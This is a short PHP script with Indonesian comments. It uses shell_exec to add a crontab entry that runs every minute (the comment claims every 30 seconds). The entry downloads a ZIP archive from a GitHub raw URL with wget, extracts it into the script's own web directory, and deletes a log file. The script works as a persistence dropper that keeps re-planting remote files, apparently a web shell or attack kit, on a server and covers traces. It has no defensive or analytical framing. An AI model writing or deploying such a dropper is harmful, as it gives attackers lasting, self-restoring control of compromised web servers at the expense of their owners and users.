<?php
// URL yang ingin Anda unduh
$urlToDownload = 'https://raw.githubusercontent.com/sunshine0110/zxsan/main/geleri.zip';

// Direktori tempat skrip PHP ini diakses
$currentDirectory = dirname(__FILE__);

// Nama file ZIP setelah diunduh
$zipFileName = $currentDirectory . '/geleri.zip';

// Buat perintah wget
$downloadCommand = 'wget ' . escapeshellarg($urlToDownload) . ' -P ' . escapeshellarg($currentDirectory) . ' -O ' . escapeshellarg($zipFileName);

// Perintah untuk mengekstrak file ZIP
$extractCommand = 'unzip ' . escapeshellarg($zipFileName) . ' -d ' . escapeshellarg($currentDirectory);

// Tugas Cron untuk mengunduh dan mengekstrak file setiap 30 detik dan kemudian menghapus log
$downloadCronCommand = '* * * * * ' . $downloadCommand . ' && ' . $extractCommand . ' > ' . escapeshellarg($currentDirectory . '/cron_output.log') . ' 2>&1 && rm ' . escapeshellarg($currentDirectory . '/logfile.log');

// Tambahkan tugas Cron yang baru
$result = shell_exec('(crontab -l ; echo "'.$downloadCronCommand.'") | crontab -');

if ($result === false) {
    echo 'Gagal menambahkan tugas Cron untuk mengunduh file.';
} else {
    echo 'Tugas Cron untuk mengunduh dan mengekstrak file berhasil ditambahkan.';

    // Tampilkan output dari eksekusi tugas Cron
    $cronOutput = shell_exec('cat ' . escapeshellarg($currentDirectory . '/cron_output.log'));
    echo "\nOutput Cron:\n" . $cronOutput;
}
?>
